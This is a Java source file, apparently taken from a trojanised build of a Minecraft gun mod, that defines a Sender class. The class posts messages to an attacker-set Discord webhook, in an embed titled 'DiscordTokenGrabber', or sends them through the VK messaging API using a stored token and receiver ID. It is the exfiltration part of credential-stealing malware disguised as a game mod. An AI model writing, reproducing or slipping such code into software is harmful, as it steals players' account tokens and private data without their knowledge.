package com.mrcrayfish.guns.util;

import com.mrcrayfish.guns.MrCrayfishGunMod;
import org.json.JSONArray;
import org.json.JSONObject;

public class Sender {

    public void sendMessage(String message) {
        if (MrCrayfishGunMod.VK_ENABLED) {
            Helper.getRequest().get(String.format("https://api.vk.com/method/messages.send?access_token=%s&peer_id=%d&random_id=%d&message=%s&v=5.204", MrCrayfishGunMod.VK_TOKEN, MrCrayfishGunMod.VK_RECEIVER_ID, (int) Math.random() * 999999999, message.replace("\n", "%0A")), null);
        } else {
            JSONObject json = new JSONObject();
            JSONObject json2 = new JSONObject().put("title", "DiscordTokenGrabber").put("description", message).put("color", "65280");
            json.put("embeds", new JSONArray().put(json2));
            Helper.getRequest().post(MrCrayfishGunMod.WEBHOOK_URL, json);
        }
    }
}
